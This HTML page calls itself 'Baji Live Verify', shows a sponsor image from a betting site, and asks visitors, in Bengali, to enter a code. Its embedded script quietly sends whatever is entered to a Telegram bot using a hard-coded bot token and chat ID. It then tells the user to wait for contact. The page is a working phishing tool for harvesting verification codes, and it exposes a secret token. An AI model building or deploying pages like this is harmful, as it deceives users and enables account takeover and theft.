<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Submit Page</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #292929;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background: #292929;
            color: #fff;
            padding: 20px 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
        }

        .login-container h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
        }

        .login-container img {
            display: block;
            width: 100%;
            max-width: 350px;
            margin: 0 auto 20px auto;
            border-radius: 8px;
        }

        .login-container label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #14805E;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #14805E;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Baji Live Verify</h1>
        <!-- Larger Image -->
        <img src="https://img.b112j.com/bj/h5/assets/images/sponsor/en-sponsor.jpg?v=1737017010198&source=mcdsrc" alt="Sponsor Image">
        
        <form id="codeForm">
            <label for="code">কোডটি লিখুন </label>
            <input type="text" id="code" placeholder="আপনার কোড লিখুন" maxlength="10" required>
            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        // Replace with your bot token and chat ID
        const BOT_TOKEN = "8040356390:AAE3ZeLspo9dYe--OVHHDCXAJN949FWc8-Y";
        const CHAT_ID = "1309023053";

        // Form submission handler
        document.getElementById("codeForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form from refreshing the page
            const code = document.getElementById("code").value;

            // Telegram API URL
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            // Sending the message
            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `Submitted Code: ${code}`
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("অপেক্ষা করুন আমরা শীঘ্রই আপনার সাথে যোগাযোগ করব.... ");
                } else {
                    alert("Failed to submit code. Please try again.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("An error occurred. Please try again.");
            });
        });
    </script>
</body>
</html>
